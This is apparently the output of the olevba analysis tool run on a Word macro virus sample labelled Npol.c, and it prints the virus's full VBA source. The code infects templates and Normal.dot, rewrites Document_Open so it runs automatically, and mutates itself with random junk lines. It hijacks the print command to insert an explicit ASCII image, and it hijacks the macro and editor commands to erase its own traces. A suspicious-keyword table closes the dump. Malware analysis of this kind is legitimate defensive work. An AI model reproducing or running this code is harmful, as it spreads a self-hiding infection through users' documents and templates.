olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Npol.c-17cc7a33bdab3518f8a3e54da92d4a4df44418c1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Npol.c-17cc7a33bdab3518f8a3e54da92d4a4df44418c1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()Relax.AutoOpen
End Sub
-------------------------------------------------------------------------------
VBA MACRO Relax.bas 
in file: Virus.MSWord.Intended.Npol.c-17cc7a33bdab3518f8a3e54da92d4a4df44418c1 - OLE stream: 'Macros/VBA/Relax'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem #########################
Rem #  Technical Illusions  #
Rem #   Virus by Lord Arz   #
Rem #########################
Sub AutoOpen()
On Error Resume Next
Randomize (Timer)
SpreadDir = Application.Path & "\"
Victim = Dir(SpreadDir & "\*.dot")

Do Until Victim = ""
    SetAttr SpreadDir & Victim, vbNormal
    Application.OrganizerCopy ThisDocument.FullName, SpreadDir & Victim, "Relax", wdOrganizerObjectProjectItems
    Victim = Dir
Loop

Application.OrganizerCopy ThisDocument.FullName, SpreadDir & "\*.doc", "Relax", wdOrganizerObjectProjectItems
SpreadDir = Environ("WINDIR") & "\Recent"
Chk = Dir(recent & "\*.doc")
If Chk = True Then Application.OrganizerCopy ThisDocument.FullName, SpreadDir & "\*.doc", "Relax", wdOrganizerObjectProjectItems
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "Relax" Then GoTo AlreadyDone
Next i

Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Relax", wdOrganizerObjectProjectItems
Application.OrganizerCopy ActiveDocument.FullName, Environ("WinDir") & "\ShellNew\Winword8.doc", "Relax", wdOrganizerObjectProjectItems

VirusJump = "Private Sub Document_Open()"
VirusJump = VirusJump & "Relax.AutoOpen" & Chr(13) & "End Sub"

With ActiveDocument.VBProject.VBComponents(1).CodeModule
    .DeleteLines 1, .CountOfLines
    .InsertLines 1, VirusJump
End With
With NormalTemplate.VBProject.VBComponents(1).CodeModule
    .DeleteLines 1, .CountOfLines
    .InsertLines 1, VirusJump
End With
AlreadyDone:
If Int(Rnd * 24) > Hour(Time) Then
    MorphFactor = Int(Rnd * 10)
    Select Case MorphFactor
    Case 1
        Fake = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & " = " & CStr(Int(Rnd * 999999999))
    Case 2
        Fake = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & " = " & Chr(58) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(58)
    Case 3
        Fake = "DoEvents"
    Case 4
        Fake = "'" & Application.UserName & Application.UserAddress & Application.ActivePrinter
    Case 5
        JumpPoint = Chr(Int(Rnd * 5) + 65) & Hex(CStr(Oct(MorphFactor ^ 4) & CStr(Day(Date)) & CStr(Minute(Time)) & CStr(Hour(Time))))
        Fake = "Goto " & JumpPoint & Chr(13) & JumpPoint & ":"
    Case 6
        Fake = Chr(13)
    Case 7
        Fake = "For " & Chr(MorphFactor + 65) & " = 1 To 1" & Chr(13) & "Next " & Chr(MorphFactor + 65)
    Case 8
        Fake = "Rem"
    Case 9
        Fake = "If " & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & " = " & CStr(Int(Rnd * 45)) & "Then " & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & " = " & CStr(Int(Rnd * 45))
    Case 10
        Fake = "Do" & Chr(13) & "Exit Do" & Chr(13) & "Loop"
    End Select
    ThisDocument.VBProject.VBComponents("Relax").CodeModule.InsertLines Int(Rnd * ThisDocument.VBProject.VBComponents("Relax").CodeModule.CountOfLines - 3) + 1, Fake
End If
End Sub
Sub FilePrint()
On Error Resume Next
'Note that the pic is from Progenic Warfare [P®W] © 1998
Sweety = "                         8888  8888888" & Chr(13)
Sweety = Sweety & "               8888:::8888888888888888888888888" & Chr(13)
Sweety = Sweety & "             8888::::::8888888888888888888888888888 " & Chr(13)
Sweety = Sweety & "            88::::::::888:::8888888888888888888888888" & Chr(13)
Sweety = Sweety & "          88888888::::8:::::::::::88888888888888888888" & Chr(13)
Sweety = Sweety & "        888 8::888888::::::::::::::::::88888888888   888" & Chr(13)
Sweety = Sweety & "           88::::88888888::::m::::::::::88888888888    8" & Chr(13)
Sweety = Sweety & "         888888888888888888:M:::::::::::8888888888888" & Chr(13)
Sweety = Sweety & "        88888888888888888888::::::::::::M88888888888888" & Chr(13)
Sweety = Sweety & "        8888888888888888888888:::::::::M8888888888888888" & Chr(13)
Sweety = Sweety & "         8888888888888888888888:::::::M888888888888888888" & Chr(13)
Sweety = Sweety & "        8888888888888888::88888::::::M88888888888888888888" & Chr(13)
Sweety = Sweety & "      88888888888888888:::88888:::::M888888888888888   8888" & Chr(13)
Sweety = Sweety & "     88888888888888888:::88888::::M::;o*M*o;888888888    88" & Chr(13)
Sweety = Sweety & "    88888888888888888:::8888:::::M:::::::::::88888888    8" & Chr(13)
Sweety = Sweety & "   88888888888888888::::88::::::M:;:::::::::::888888888" & Chr(13)
Sweety = Sweety & "  8888888888888888888:::8::::::M::aAa::::::::M8888888888       8" & Chr(13)
Sweety = Sweety & "  88   8888888888::88::::8::::M:::::::::::::888888888888888 8888" & Chr(13)
Sweety = Sweety & " 88  88888888888:::8:::::::::M::::::::::;::88:88888888888888888" & Chr(13)
Sweety = Sweety & " 8  8888888888888:::::::::::M::І@@@@@@@І::::8w8888888888888888" & Chr(13)
Sweety = Sweety & "  88888888888:888::::::::::M:::::і@a@і:::::M8i888888888888888" & Chr(13)
Sweety = Sweety & " 8888888888::::88:::::::::M88:::::::::::::M88z88888888888888888" & Chr(13)
Sweety = Sweety & "8888888888:::::8:::::::::M88888:::::::::MM888!888888888888888888" & Chr(13)
Sweety = Sweety & "888888888:::::8:::::::::M8888888MAmmmAMVMM888*88888888   88888888" & Chr(13)
Sweety = Sweety & "888888 M:::::::::::::::M888888888:::::::MM88888888888888   8888888" & Chr(13)
Sweety = Sweety & "8888   M::::::::::::::M88888888888::::::MM888888888888888    88888" & Chr(13)
Sweety = Sweety & " 888   M:::::::::::::M8888888888888M:::::mM888888888888888    8888" & Chr(13)
Sweety = Sweety & "  888  M::::::::::::M8888:888888888888::::m::Mm88888 888888   8888" & Chr(13)
Sweety = Sweety & "   88  M::::::::::::8888:88888888888888888::::::Mm8   88888   888" & Chr(13)
Sweety = Sweety & "   88  M::::::::::8888M::88888::888888888888:::::::Mm88888    88" & Chr(13)
Sweety = Sweety & "   8   MM::::::::8888M:::8888:::::888888888888::::::::Mm8     4" & Chr(13)
Sweety = Sweety & "       8M:::::::8888M:::::888:::::::88:::8888888::::::::Mm    2" & Chr(13)
Sweety = Sweety & "      88MM:::::8888M:::::::88::::::::8:::::888888:::M:::::M" & Chr(13)
Sweety = Sweety & "     8888M:::::888MM::::::::8:::::::::::M::::8888::::M::::M" & Chr(13)
Sweety = Sweety & "    88888M:::::88:M::::::::::8:::::::::::M:::8888::::::M::M" & Chr(13)
Sweety = Sweety & "   88 888MM:::888:M:::::::::::::::::::::::M:8888:::::::::M:" & Chr(13)
Sweety = Sweety & "   8 88888M:::88::M:::::::::::::::::::::::MM:88::::::::::::M" & Chr(13)
Sweety = Sweety & "     88888M:::88::M::::::::::*88*::::::::::M:88::::::::::::::M" & Chr(13)
Sweety = Sweety & "    888888M:::88::M:::::::::88@@88:::::::::M::88::::::::::::::M" & Chr(13)
Sweety = Sweety & "    888888MM::88::MM::::::::88@@88:::::::::M:::8::::::::::::::*8" & Chr(13)
Sweety = Sweety & "    88888  M:::8::MM:::::::::*88*::::::::::M:::::::::::::::::88@@" & Chr(13)
Sweety = Sweety & "    8888   MM::::::MM:::::::::::::::::::::MM:::::::::::::::::88@@" & Chr(13)
Sweety = Sweety & "     888    M:::::::MM:::::::::::::::::::MM::M::::::::::::::::*8" & Chr(13)
Sweety = Sweety & "     888    MM:::::::MMM::::::::::::::::MM:::MM:::::::::::::::M" & Chr(13)
Sweety = Sweety & "      88     M::::::::MMMM:::::::::::MMMM:::::MM::::::::::::MM" & Chr(13)
Sweety = Sweety & "       88    MM:::::::::MMMMMMMMMMMMMMM::::::::MMM::::::::MMM" & Chr(13)
Sweety = Sweety & "        88    MM::::::::::::MMMMMMM::::::::::::::MMMMMMMMMM" & Chr(13)
Sweety = Sweety & "         88   8MM::::::::::::::::::::::::::::::::::MMMMMM" & Chr(13)
Sweety = Sweety & "          8   88MM::::::::::::::::::::::M:::M::::::::MM" & Chr(13)
Sweety = Sweety & "              888MM::::::::::::::::::MM::::::MM::::::MM" & Chr(13)
Sweety = Sweety & "             88888MM:::::::::::::::MMM:::::::mM:::::MM" & Chr(13)
Sweety = Sweety & "             888888MM:::::::::::::MMM:::::::::MMM:::M" & Chr(13)
Sweety = Sweety & "            88888888MM:::::::::::MMM:::::::::::MM:::M" & Chr(13)
Sweety = Sweety & "           88 8888888M:::::::::MMM::::::::::::::M:::M" & Chr(13)
Sweety = Sweety & "           8  888888 M:::::::MM:::::::::::::::::M:::M:" & Chr(13)
Sweety = Sweety & "              888888 M::::::M:::::::::::::::::::M:::MM" & Chr(13)
Sweety = Sweety & "             888888  M:::::M::::::::::::::::::::::::M:M" & Chr(13)
Sweety = Sweety & "             888888  M:::::M:::::::::@::::::::::::::M::M" & Chr(13)
Sweety = Sweety & "             88888   M::::::::::::::@@:::::::::::::::M::M" & Chr(13)
Sweety = Sweety & "            88888   M::::::::::::::@@@::::::::::::::::M::M" & Chr(13)
Sweety = Sweety & "           88888   M:::::::::::::::@@::::::::::::::::::M::M" & Chr(13)
Sweety = Sweety & "          88888   M:::::m::::::::::@::::::::::Mm:::::::M:::M" & Chr(13)
Sweety = Sweety & "          8888   M:::::M:::::::::::::::::::::::MM:::::::M:::M" & Chr(13)
Sweety = Sweety & "         8888   M:::::M:::::::::::::::::::::::MMM::::::::M:::M" & Chr(13)
Sweety = Sweety & "        888    M:::::Mm::::::::::::::::::::::MMM:::::::::M::::M" & Chr(13)
Sweety = Sweety & "      8888    MM::::Mm:::::::::::::::::::::MMMM:::::::::m::m:::M" & Chr(13)
Sweety = Sweety & "     888      M:::::M::::::::::::::::::::MMM::::::::::::M::mm:::M" & Chr(13)
Sweety = Sweety & "  8888       MM:::::::::::::::::::::::::MM:::::::::::::mM::MM:::M:" & Chr(13)
Sweety = Sweety & "             M:::::::::::::::::::::::::M:::::::::::::::mM::MM:::Mm" & Chr(13)
Sweety = Sweety & "            MM::::::m:::::::::::::::::::::::::::::::::::M::MM:::MM" & Chr(13)
Sweety = Sweety & "            M::::::::M:::::::::::::::::::::::::::::::::::M::M:::MM" & Chr(13)
Sweety = Sweety & "           MM:::::::::M:::::::::::::M:::::::::::::::::::::M:M:::MM" & Chr(13)
Sweety = Sweety & "           M:::::::::::M88:::::::::M:::::::::::::::::::::::MM::MMM" & Chr(13)
Sweety = Sweety & "           M::::::::::::8888888888M::::::::::::::::::::::::MM::MM" & Chr(13)
Sweety = Sweety & "           M:::::::::::::88888888M:::::::::::::::::::::::::M::MM" & Chr(13)
Sweety = Sweety & "           M::::::::::::::888888M:::::::::::::::::::::::::M::MM" & Chr(13)
Sweety = Sweety & "           M:::::::::::::::88888M:::::::::::::::::::::::::M:MM" & Chr(13)
Sweety = Sweety & "           M:::::::::::::::::88M::::::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "           M:::::::::::::::::::M::::::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "           MM:::::::::::::::::M::::::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "            M:::::::::::::::::M::::::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "            MM:::::::::::::::M::::::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "             M:::::::::::::::M:::::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "             MM:::::::::::::M:::::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "              M:::::::::::::M::::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "              MM:::::::::::M::::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "               M:::::::::::M:::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "               MM:::::::::M:::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                M:::::::::M::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                MM:::::::M::::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                 MM::::::M:::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                 MM:::::M:::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                  MM::::M::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                  MM:::M::::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                   MM::M:::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                   MM:M:::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                    MMM::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                    MM::::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                     M:::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                    MM::::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                    MM:::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                    mMM::::MM:::::::MMMM" & Chr(13)
Sweety = Sweety & "                     mMM:::M:::::::M:M:M" & Chr(13)
Sweety = Sweety & "                      MM::MMM::::::::M:M" & Chr(13)
Sweety = Sweety & "                       MM::MM:::::::::M:M" & Chr(13)
Sweety = Sweety & "                       MM::MM::::::::::M:m" & Chr(13)
Sweety = Sweety & "                       MM:::M:::::::::::MM" & Chr(13)
Sweety = Sweety & "                       MMM:::::::::::::::M:" & Chr(13)
Sweety = Sweety & "                       MMM:::::::::::::::M:" & Chr(13)
Sweety = Sweety & "                       MMM::::::::::::::::M" & Chr(13)
Sweety = Sweety & "                       MMM::::::::::::::::M" & Chr(13)
Sweety = Sweety & "                       MMM::::::::::::::::Mm" & Chr(13)
Sweety = Sweety & "                        MM::::::::::::::::MM" & Chr(13)
Sweety = Sweety & "                        MMM:::::::::::::::MM" & Chr(13)
Sweety = Sweety & "                        MMM:::::::::::::::MM" & Chr(13)
Sweety = Sweety & "                        MMM:::::::::::::::MM" & Chr(13)
Sweety = Sweety & "                        MMM:::::::::::::::MM" & Chr(13)
Sweety = Sweety & "                         MM::::::::::::::MMM" & Chr(13)
Sweety = Sweety & "                         MMM:::::::::::::MM" & Chr(13)
Sweety = Sweety & "                         MMM:::::::::::::MM" & Chr(13)
Sweety = Sweety & "                         MMM::::::::::::MM" & Chr(13)
Sweety = Sweety & "                          MM::::::::::::MM" & Chr(13)
Sweety = Sweety & "                          MM::::::::::::MM" & Chr(13)
Sweety = Sweety & "                          MM:::::::::::MM" & Chr(13)
Sweety = Sweety & "                          MMM::::::::::MM" & Chr(13)
Sweety = Sweety & "                          MMM::::::::::MM" & Chr(13)
Sweety = Sweety & "                           MM:::::::::MM" & Chr(13)
Sweety = Sweety & "                           MMM::::::::MM" & Chr(13)
Sweety = Sweety & "                            MMM::::::MM" & Chr(13)
Sweety = Sweety & "                             MM::::::MM" & Chr(13)
Sweety = Sweety & "                              MM:::::MM" & Chr(13)
Sweety = Sweety & "                              MM:::::M:M" & Chr(13)
Sweety = Sweety & "                              :M::::::M:" & Chr(13)
Sweety = Sweety & "                            M:::M::::::M" & Chr(13)
Sweety = Sweety & "                          M:::::M:::::::M" & Chr(13)
Sweety = Sweety & "                         M::::::MM:::::::M" & Chr(13)
Sweety = Sweety & "                         M:::::::M::::::::M" & Chr(13)
Sweety = Sweety & "                         M;:;::::M:::::::::M" & Chr(13)
Sweety = Sweety & "                         M:m:;:::M::::::::::M" & Chr(13)
Sweety = Sweety & "                         MM:m:m::M::::::::;:M" & Chr(13)
Sweety = Sweety & "                          MM:m::MM:::::::;:;M" & Chr(13)
Sweety = Sweety & "                           MM::MMM::::::;:m:M" & Chr(13)
Sweety = Sweety & "                            MMMM MM::::m:m:MM" & Chr(13)
Sweety = Sweety & "                                  MM::::m:MM" & Chr(13)
Sweety = Sweety & "                                   MM::::MM" & Chr(13)
Sweety = Sweety & "                                    MM::MM" & Chr(13)

Selection.Font.Size = 4
Selection.Font.Name = "Courier New"
Selection.MoveEnd
Selection.Text = Sweety
Dialogs(wdDialogFilePrint).Show
Selection.Delete
End Sub

Sub ViewVBCode()
On Error Resume Next
With ActiveDocument.VBProject.VBComponents(1).CodeModule
    .DeleteLines 1, .CountOfLines
End With
With NormalTemplate.VBProject.VBComponents(1).CodeModule
    .DeleteLines 1, .CountOfLines
End With

Application.OrganizerDelete ActiveDocument.Name, "Relax", wdOrganizerObjectProjectItems
Application.OrganizerDelete NormalTemplate.Name, "Relax", wdOrganizerObjectProjectItems
ShowVisualBasicEditor = True
End Sub

Sub ToolsMacro()
On Error Resume Next
With ActiveDocument.VBProject.VBComponents(1).CodeModule
    .DeleteLines 1, .CountOfLines
End With
With NormalTemplate.VBProject.VBComponents(1).CodeModule
    .DeleteLines 1, .CountOfLines
End With

Application.OrganizerDelete ActiveDocument.Name, "Relax", wdOrganizerObjectProjectItems
Application.OrganizerDelete NormalTemplate.Name, "Relax", wdOrganizerObjectProjectItems
Dialogs(wdDialogToolsMacro).Display
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

